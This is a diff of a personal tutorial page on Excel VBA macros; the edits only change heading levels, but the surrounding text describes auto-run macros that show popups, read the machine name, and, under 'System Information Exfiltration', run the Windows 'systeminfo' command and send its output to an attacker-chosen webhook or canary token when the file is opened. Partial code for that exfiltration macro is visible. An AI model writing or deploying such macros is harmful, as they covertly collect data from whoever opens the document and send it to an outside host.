@@ -1,14 +1,14 @@
 # Microsoft Macros
 
-### Introduction
+## Introduction
 
 Macros on Microsoft app \(Word, Excel, etc.\) allow a user to run Visual Basic Code in the background of a document. This section of my website will be dedicated to playing around with macros, and finding ways to extract information from the client.
 
-### Setup
+## Setup
 
 In order to create a Excel file that we are able to create macros, we will have create a file with an extension of ".xlsm". This version of Excel has macros enabled, and will allow us to make and edit macros on it. This file version should be standard in Excel, so in order to do this, you just have to create a file and save it in the ".xlsm" format. Under the View tab, you will see Macros, and from there you can edit the macros.
 
-### Popup Message
+## Popup Message
 
 We can create a popup message that will appear when somebody enables the macros when they first open the document.
 
@@ -19,7 +19,7 @@ Sub Auto_Open()
 End Sub
 ```
 
-### Print Desktop Name
+## Print Desktop Name
 
 We can use the Visual Basic code to display the name of the Desktop to the screen when macros are enabled.
 
@@ -38,7 +38,7 @@ We have to copy this code under Microsoft Excel Objects in order to get it to wo
 
 After this you can save and exit the Excel file. When you open it again, there should be a popup with the Desktop name.
 
-### System Information Exfiltration
+## System Information Exfiltration
 
 This code is meant for Windows systems \(tested on Windows 10\), and sends the output of the "systeminfo" command on Windows to an external website, where you can read it by entering your own web-hook link. The client will notice the Command Prompt pop up for this code.
 
@@ -53,10 +53,9 @@ Sub Workbook_Open()
     objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
     objHTTP.send ("Systeminfo: " + Excel_Shell_Exec.StdOut.ReadAll)
 End Sub
-
 ```
 
-### Integrating Canary Tokens
+## Integrating Canary Tokens
 
 Canary Tokens are a way to track an IP address when they do a certain task. This could be accessing a website or even requesting a DNS hostname. We can use the previous code and incorporate a Canary Token into it.
 
@@ -71,7 +70,6 @@ Sub Workbook_Open()
     objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
     objHTTP.send ("Systeminfo: " + Excel_Shell_Exec.StdOut.ReadAll)
 End Sub
-
 ```
 
 In line 6, we can see the canary token being used. Once we access the token, it then sends the information to the email or web-hook we have used initially. Our output should look like this:
